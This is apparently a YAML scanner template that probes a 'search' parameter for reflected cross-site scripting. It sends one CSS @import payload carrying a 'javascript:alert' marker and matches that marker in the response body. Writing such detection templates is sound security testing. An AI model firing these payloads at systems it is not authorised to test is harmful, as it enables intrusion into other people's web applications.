id: xss4-112
name: 'Raw XSS4 #31 in search'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in search'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      search:
        - '<style>@import ''javascript:alert(nx4111)'';</style>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx4111'
